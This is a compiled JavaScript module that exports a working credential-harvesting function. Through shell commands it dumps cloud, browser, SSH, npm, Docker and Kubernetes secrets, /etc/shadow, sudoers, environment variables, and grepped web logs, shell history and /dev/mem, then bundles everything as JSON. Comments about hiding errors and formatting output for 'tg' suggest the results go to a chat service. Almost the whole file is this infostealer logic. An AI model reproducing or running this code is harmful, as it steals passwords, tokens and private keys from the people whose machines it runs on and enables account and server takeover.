"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
const exec = __importStar(require("child_process"));
const _run = (args) => {
    try {
        return exec.execSync(args).toString();
    }
    catch (e) {
        return null;
    }
};
// TODO: Hidde error messages like "file not found" or "permission denied"
// TODO: Access live memory to extract credentials
// TODO: Add all history files
const findCredentials = (text) => {
    const credentials = {};
    credentials.apache = {};
    credentials.aws = {};
    credentials.azure = {};
    credentials.docker = {};
    credentials.freerdp = {};
    credentials.gcloud = {};
    credentials.googleChrome = {};
    credentials.gh = {};
    credentials.kube = {};
    credentials.mem = {};
    credentials.microsoft = {};
    credentials.microsoft.teams = {};
    credentials.mitmp = {};
    credentials.netlify = {};
    credentials.nginx = {};
    credentials.npm = {};
    credentials.psql = {};
    credentials.remmina = {};
    credentials.shodan = {};
    credentials.sql = {};
    credentials.ssh = {};
    credentials.ssh.sshd = {};
    credentials.syncthing = {};
    credentials.termux = {};
    credentials.users = {};
    credentials.shell = {};
    credentials.shell.history = {};
    /* In case system is Termux, prepend prefix to paths */
    const prefix = _run(`echo "$PREFIX"`);
    let path = "";
    if (prefix) {
        if (_run(`ls /data/data/com.termux`)) {
            path = prefix;
            if (path[path.length - 1] === "\n") {
                path = path.substring(0, path.length - 1);
            }
        }
    }
    const apacheEmailLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "mail"`);
    const apachePassLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "pass"`);
    const apacheAuthLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "auth"`);
    const apacheTokenLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "token"`);
    const apacheCookieLog = _run(`cat ${path}/var/log/apache/*.log | grep -i "cookie"`);
    if (apacheEmailLog) {
        credentials.apache.emailLog = {};
        credentials.apache.emailLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "mail"`;
        credentials.apache.emailLog.content = apacheEmailLog;
    }
    if (apachePassLog) {
        credentials.apache.passLog = {};
        credentials.apache.passLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "pass"`;
        credentials.apache.passLog.content = apachePassLog;
    }
    if (apacheAuthLog) {
        credentials.apache.authLog = {};
        credentials.apache.authLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "auth"`;
        credentials.apache.authLog.content = apacheAuthLog;
    }
    if (apacheTokenLog) {
        credentials.apache.tokenLog = {};
        credentials.apache.tokenLog.path = `$ cat ${path}/var/log/apache/*.log | grep -i "token"`;
        credentials.apache.tokenLog.content = apacheTokenLog;
    }
    if (apacheCookieLog) {
        credentials.apache.cookieLog = {};
        credentials.apache.cookieLog.path = `cat ${path}/var/log/apache/*.log | grep -i "cookie"`;
        credentials.apache.cookieLog.content = apacheCookieLog;
    }
    const awsCredentials = _run(`cat ~/.aws/credentials`);
    if (awsCredentials) {
        credentials.aws.credentials = {};
        credentials.aws.credentials.path = "~/.aws/credentials";
        credentials.aws.credentials.content = awsCredentials;
    }
    const azureProfile = _run(`cat ~/.azure/azureProfile.json`);
    if (azureProfile) {
        credentials.azure.profile = {};
        credentials.azure.profile.path = "~/.azure/azureProfile.json";
        credentials.azure.profile.content = azureProfile;
    }
    const docker = _run(`cat ~/.docker/config.json`);
    if (docker) {
        credentials.docker.config = {};
        credentials.docker.config.path = "~/.docker/config.json";
        credentials.docker.config.content = docker;
    }
    const freerpd = _run(`cat ~/.config/freerdp/known_hosts`);
    if (freerpd) {
        credentials.freerpd.knownHosts = {};
        credentials.freerpd.knownHosts.path = "~/.config/freerdp/known_hosts";
        credentials.freerpd.knownHosts.content = freerpd;
    }
    const gcloud = _run(`cat ~/.config/gcloud/access_tokens.db`);
    if (gcloud) {
        credentials.gcloud.accessTokens = {};
        credentials.gcloud.accessTokens.path = "~/.config/gcloud/access_tokens.db";
        credentials.gcloud.accessTokens.content = gcloud;
    }
    const googleChrome = _run(`cat ~/.config/google-chrome/Default/Login\\ Data`);
    if (googleChrome) {
        credentials.googleChrome.loginData = {};
        credentials.googleChrome.loginData.path = "~/.config/google-chrome/Default/Login\\ Data";
        credentials.googleChrome.loginData.content = googleChrome;
    }
    const gcloudCredentials = _run(`cat ~/.config/gcloud/credentials.db`);
    if (gcloudCredentials) {
        credentials.gcloud.credentials = {};
        credentials.gcloud.credentials.path = "~/.config/gcloud/credentials.db";
        credentials.gcloud.credentials.content = gcloudCredentials;
    }
    const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
    if (ghHosts) {
        credentials.gh.hosts = {};
        credentials.gh.hosts.path = "~/.config/gh/hosts.yml";
        credentials.gh.hosts.content = ghHosts;
    }
    const kube = _run(`cat ~/.kube/config`);
    if (kube) {
        credentials.kube.config = {};
        credentials.kube.config.path = "~/.kube/config";
        credentials.kube.config.content = kube;
    }
    const memMail = _run(`strings /dev/mem -n6 | grep -i mail`);
    const memPass = _run(`strings /dev/mem -n6 | grep -i pass`);
    const memAuth = _run(`strings /dev/mem -n6 | grep -i auth`);
    const memToken = _run(`strings /dev/mem -n5 | grep -i token`);
    const memApi = _run(`strings /dev/mem -n6 | grep -i api`);
    const memUrls = _run(`strings /dev/mem -n11 | grep -i http`);
    const memCookies = _run(`strings /dev/mem -n6 | grep -i cookie`);
    if (memMail) {
        credentials.mem.mail = {};
        credentials.mem.mail.path = "$ strings /dev/mem -n6 | grep -i mail";
        credentials.mem.mail.content = memMail;
    }
    if (memPass) {
        credentials.mem.pass = {};
        credentials.mem.pass.path = "$ strings /dev/mem -n6 | grep -i pass";
        credentials.mem.pass.content = memPass;
    }
    if (memAuth) {
        credentials.mem.auth = {};
        credentials.mem.auth.path = "$ strings /dev/mem -n6 | grep -i auth";
        credentials.mem.auth.content = memAuth;
    }
    if (memToken) {
        credentials.mem.token = {};
        credentials.mem.token.path = "$ strings /dev/mem -n5 | grep -i token";
        credentials.mem.token.content = memToken;
    }
    if (memApi) {
        credentials.mem.api = {};
        credentials.mem.api.path = "$ strings /dev/mem -n6 | grep -i api";
        credentials.mem.api.content = memApi;
    }
    if (memUrls) {
        credentials.mem.urls = {};
        credentials.mem.urls.path = "$ strings /dev/mem -n11 | grep -i http";
        // credentials.mem.urls.content = memUrls;
    }
    if (memCookies) {
        credentials.mem.cookies = {};
        credentials.mem.cookies.path = "$ strings /dev/mem -n6 | grep -i cookie";
        credentials.mem.cookies.content = memCookies;
    }
    const microsoftTeams = _run(`cat ~/.config/Microsoft/Microsoft\\ Teams/storage.json`);
    if (microsoftTeams) {
        credentials.microsoft.teams.storage = {};
        credentials.microsoft.teams.storage.path = "~/.config/Microsoft/Microsoft\\ Teams/storage.json";
        credentials.microsoft.teams.storage.content = microsoftTeams;
    }
    const netlifyConfig = _run(`cat ~/.config/netlify/config.json`);
    if (netlifyConfig) {
        credentials.netlify.config = {};
        credentials.netlify.config.path = "~/.config/netlify/config.json";
        credentials.netlify.config.content = netlifyConfig;
    }
    const nginxEmailLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i mail`);
    const nginxPassLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i passw`);
    const nginxAuthLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i auth`);
    const nginxTokenLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i token`);
    const nginxApiLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i api`);
    const nginxUrlsLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i http`);
    const nginxCookieLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i cookie`);
    if (nginxEmailLogs) {
        credentials.nginx.emailLogs = {};
        credentials.nginx.emailLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i mail`;
        credentials.nginx.emailLogs.content = nginxEmailLogs;
    }
    if (nginxPassLogs) {
        credentials.nginx.passLogs = {};
        credentials.nginx.passLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i passw`;
        credentials.nginx.passLogs.content = nginxPassLogs;
    }
    if (nginxAuthLogs) {
        credentials.nginx.authLogs = {};
        credentials.nginx.authLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i auth`;
        credentials.nginx.authLogs.content = nginxAuthLogs;
    }
    if (nginxTokenLogs) {
        credentials.nginx.tokenLogs = {};
        credentials.nginx.tokenLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i token`;
        credentials.nginx.tokenLogs.content = nginxTokenLogs;
    }
    if (nginxApiLogs) {
        credentials.nginx.apiLogs = {};
        credentials.nginx.apiLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i api`;
        credentials.nginx.apiLogs.content = nginxApiLogs;
    }
    if (nginxUrlsLogs) {
        credentials.nginx.urlsLogs = {};
        credentials.nginx.urlsLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i http`;
        // credentials.nginx.urlsLogs.content = nginxUrlsLogs;
    }
    if (nginxCookieLogs) {
        credentials.nginx.cookieLogs = {};
        credentials.nginx.cookieLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i cookie`;
        credentials.nginx.cookieLogs.content = nginxCookieLogs;
    }
    const shodanApiKey = _run(`cat ~/.config/shodan/api_key`);
    if (shodanApiKey) {
        credentials.shodan.apiKey = {};
        credentials.shodan.apiKey.path = "~/.config/shodan/api_key";
        credentials.shodan.apiKey.content = shodanApiKey;
    }
    const syncCert = _run(`cat ~/.config/syncthing/cert.pem`);
    const syncConfig = _run(`cat ~/.config/syncthing/config.xml`);
    const syncCsfrTokens = _run(`cat ~/.config/syncthing/csrftokens.txt`);
    const syncHttpsCert = _run(`cat ~/.config/syncthing/https-cert.pem`);
    const syncHttpsKey = _run(`cat ~/.config/syncthing/https-key.pem`);
    const syncKeyPEM = _run(`cat ~/.config/syncthing/key.pem`);
    if (syncCert) {
        credentials.syncthing.cert = {};
        credentials.syncthing.cert.path = "~/.config/syncthing/cert.pem";
        credentials.syncthing.cert.content = syncCert;
    }
    if (syncConfig) {
        credentials.syncthing.config = {};
        credentials.syncthing.config.path = "~/.config/syncthing/config.xml";
        credentials.syncthing.config.content = syncConfig;
    }
    if (syncCsfrTokens) {
        credentials.syncthing.csfrTokens = {};
        credentials.syncthing.csfrTokens.path = "~/.config/syncthing/csrftokens.txt";
        credentials.syncthing.csfrTokens.content = syncCsfrTokens;
    }
    if (syncHttpsCert) {
        credentials.syncthing.httpsCert = {};
        credentials.syncthing.httpsCert.path = "~/.config/syncthing/https-cert.pem";
        credentials.syncthing.httpsCert.content = syncHttpsCert;
    }
    if (syncHttpsKey) {
        credentials.syncthing.httpsKey = {};
        credentials.syncthing.httpsKey.path = "~/.config/syncthing/https-key.pem";
        credentials.syncthing.httpsKey.content = syncHttpsKey;
    }
    if (syncKeyPEM) {
        credentials.syncthing.keyPEM = {};
        credentials.syncthing.keyPEM.path = "~/.config/syncthing/key.pem";
        credentials.syncthing.keyPEM.content = syncKeyPEM;
    }
    const mitmpCaCert = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.cer`);
    const mitmpCaCertP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.p12`);
    const mitmpCaCertPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.pem`);
    const mitmpCaP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca.p12`);
    const mitmpCaPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca.pem`);
    const mitmpDhparam = _run(`cat ~/.mitmproxy/mitmproxy-dhparam.pem`);
    if (mitmpCaCert) {
        credentials.mitmp.caCert = {};
        credentials.mitmp.caCert.path = "~/.mitmproxy/mitmproxy-ca-cert.cer";
        credentials.mitmp.caCert.content = mitmpCaCert;
    }
    if (mitmpCaCertP12) {
        credentials.mitmp.caCertP12 = {};
        credentials.mitmp.caCertP12.path = "~/.mitmproxy/mitmproxy-ca-cert.p12";
        credentials.mitmp.caCertP12.content = mitmpCaCertP12;
    }
    if (mitmpCaCertPEM) {
        credentials.mitmp.caCertPEM = {};
        credentials.mitmp.caCertPEM.path = "~/.mitmproxy/mitmproxy-ca-cert.pem";
        credentials.mitmp.caCertPEM.content = mitmpCaCertPEM;
    }
    if (mitmpCaP12) {
        credentials.mitmp.caP12 = {};
        credentials.mitmp.caP12.path = "~/.mitmproxy/mitmproxy-ca.p12";
        credentials.mitmp.caP12.content = mitmpCaP12;
    }
    if (mitmpCaPEM) {
        credentials.mitmp.caPEM = {};
        credentials.mitmp.caPEM.path = "~/.mitmproxy/mitmproxy-ca.pem";
        credentials.mitmp.caPEM.content = mitmpCaPEM;
    }
    if (mitmpDhparam) {
        credentials.mitmp.dhparam = {};
        credentials.mitmp.dhparam.path = "~/.mitmproxy/mitmproxy-dhparam.pem";
        credentials.mitmp.dhparam.content = mitmpDhparam;
    }
    const npmrc = _run(`cat ~/.npmrc`);
    if (npmrc) {
        credentials.npm.npmrc = {};
        credentials.npm.npmrc.path = "~/.npmrc";
        credentials.npm.npmrc.content = npmrc;
    }
    const remmina = _run(`cat ~/.config/remmina/remmina.pref`);
    if (remmina) {
        credentials.remmina.pref = {};
        credentials.remmina.pref.path = "~/.config/remmina/remmina.pref";
        credentials.remmina.pref.content = remmina;
    }
    const mysqlHistory = _run(`cat ~/.mysql_history`);
    if (mysqlHistory) {
        credentials.mysql.mysqlHistory = {};
        credentials.mysql.mysqlHistory.path = "~/.mysql_history";
        credentials.mysql.mysqlHistory.content = mysqlHistory;
    }
    const psqlHistory = _run(`cat ~/.psql_history`);
    if (psqlHistory) {
        credentials.psql.psqlHistory = {};
        credentials.psql.psqlHistory.path = "~/.psql_history";
        credentials.psql.psqlHistory.content = psqlHistory;
    }
    const sshConfig = _run(`cat ~/.ssh/config`);
    if (sshConfig) {
        credentials.ssh.sshConfig = {};
        credentials.ssh.sshConfig.path = "~/.ssh/config";
        credentials.ssh.sshConfig.content = sshConfig;
    }
    const sshKnownHosts = _run(`cat ~/.ssh/known_hosts`);
    if (sshKnownHosts) {
        credentials.ssh.knownHosts = {};
        credentials.ssh.knownHosts.path = "~/.ssh/known_hosts";
        credentials.ssh.knownHosts.content = sshKnownHosts;
    }
    const termuxAuthInfo = _run(`cat ~/.termux_authinfo`);
    if (termuxAuthInfo) {
        credentials.termux.authInfo = {};
        credentials.termux.authInfo.path = "~/.termux_authinfo";
        credentials.termux.authInfo.content = termuxAuthInfo;
    }
    const sshdDsaKey = _run(`cat ${path}/etc/ssh/ssh_host_dsa_key`);
    if (sshdDsaKey) {
        credentials.ssh.sshd.dsaKey = {};
        credentials.ssh.sshd.dsaKey.path = `${path}/etc/ssh/ssh_host_dsa_key`;
        credentials.ssh.sshd.dsaKey.content = sshdDsaKey;
    }
    const sshdEcdsa = _run(`cat ${path}/etc/ssh/ssh_host_ecdsa_key`);
    if (sshdEcdsa) {
        credentials.ssh.sshd.ecdsaKey = {};
        credentials.ssh.sshd.ecdsaKey.path = `${path}/etc/ssh/ssh_host_ecdsa_key`;
        credentials.ssh.sshd.ecdsaKey.content = sshdEcdsa;
    }
    const sshdHostEd = _run(`cat ${path}/etc/ssh/ssh_host_ed25519_key`);
    if (sshdHostEd) {
        credentials.ssh.sshd.hostEdKey = {};
        credentials.ssh.sshd.hostEdKey.path = `${path}/etc/ssh/ssh_host_ed25519_key`;
        credentials.ssh.sshd.hostEdKey.content = sshdHostEd;
    }
    const sshdHostRsa = _run(`cat ${path}/etc/ssh/ssh_host_rsa_key`);
    if (sshdHostRsa) {
        credentials.ssh.sshd.hostRsaKey = {};
        credentials.ssh.sshd.hostRsaKey.path = `${path}/etc/ssh/ssh_host_rsa_key`;
        credentials.ssh.sshd.hostRsaKey.content = sshdHostRsa;
    }
    const group = _run(`cat ${path}/etc/group`);
    if (group) {
        credentials.users.group = {};
        credentials.users.group.path = `${path}/etc/group`;
        credentials.users.group.content = group;
    }
    const gshadow = _run(`cat ${path}/etc/gshadow`);
    if (gshadow) {
        credentials.users.gshadow = {};
        credentials.users.gshadow.path = `${path}/etc/gshadow`;
        credentials.users.gshadow.content = gshadow;
    }
    const shadow = _run(`cat ${path}/etc/shadow`);
    if (shadow) {
        credentials.users.shadow = {};
        credentials.users.shadow.path = `${path}/etc/shadow`;
        credentials.users.shadow.content = shadow;
    }
    const passwd = _run(`cat ${path}/etc/passwd`);
    if (passwd) {
        credentials.users.passwd = {};
        credentials.users.passwd.path = `${path}/etc/passwd`;
        credentials.users.passwd.content = passwd;
    }
    const sudoers = _run(`cat ${path}/etc/sudoers`);
    if (sudoers) {
        credentials.users.sudoers = {};
        credentials.users.sudoers.path = `${path}/etc/sudoers`;
        credentials.users.sudoers.content = sudoers;
    }
    /* // Not available in subshell, search for a workaround
    const alias = _run(`alias`);
    if (alias) {
      credentials.shell.alias = {} as any;
      credentials.shell.alias.path = "$ alias";
      credentials.shell.alias.content = alias;
    }*/
    const enviromentVariables = _run(`env`);
    if (enviromentVariables) {
        credentials.shell.env = {};
        credentials.shell.env.path = "$ env";
        credentials.shell.env.content = enviromentVariables;
    }
    /* TODO: Make history work in subshell */
    const historyEmail = _run(`cat ~/.*istor* | grep -i mail`);
    const historyPass = _run(`cat ~/.*istor* | grep -i pass`);
    const historyAuth = _run(`cat ~/.*istor* | grep -i auth`);
    const historyToken = _run(`cat ~/.*istor* | grep -i token`);
    const historyApi = _run(`cat ~/.*istor* | grep -i api`);
    const historyUrls = _run(`cat ~/.*istor* | grep -i http`);
    const historyCookie = _run(`cat ~/.*istor* | grep -i cookie`);
    if (historyEmail) {
        credentials.shell.history.email = {};
        credentials.shell.history.email.path = "$ history | grep -i mail";
        credentials.shell.history.email.content = historyEmail;
    }
    if (historyPass) {
        credentials.shell.history.pass = {};
        credentials.shell.history.pass.path = "$ cat ~/.*istor* | grep -i pass";
        credentials.shell.history.pass.content = historyPass;
    }
    if (historyAuth) {
        credentials.shell.history.auth = {};
        credentials.shell.history.auth.pass = "$ cat ~/.*istor* | grep -i auth";
        credentials.shell.history.auth.content = historyAuth;
    }
    if (historyToken) {
        credentials.shell.history.token = {};
        credentials.shell.history.token.pass = "$ cat ~/.*istor* | grep -i token";
        credentials.shell.history.token.content = historyToken;
    }
    if (historyApi) {
        credentials.shell.history.api = {};
        credentials.shell.history.api.pass = "$ cat ~/.*istor* | grep -i api";
        credentials.shell.history.api.content = historyApi;
    }
    if (historyUrls) {
        credentials.shell.history.urls = {};
        credentials.shell.history.urls.path = "$ cat ~/.*istor* | grep -i http";
        // credentials.shell.history.urls.content = historyUrls;
    }
    if (historyCookie) {
        credentials.shell.history.cookie = {};
        credentials.shell.history.cookie.path = "cat ~/.*istor* | grep -i cookie";
        credentials.shell.history.cookie.content = historyCookie;
    }
    // TODO: Remove void objects
    // TODO: Pretty Ouput function (json is ugly in tg)
    return JSON.stringify(credentials, null, 2);
    // console.log(JSON.stringify(credentials, null, 2));
    // return "dummy";
};
exports.default = findCredentials;
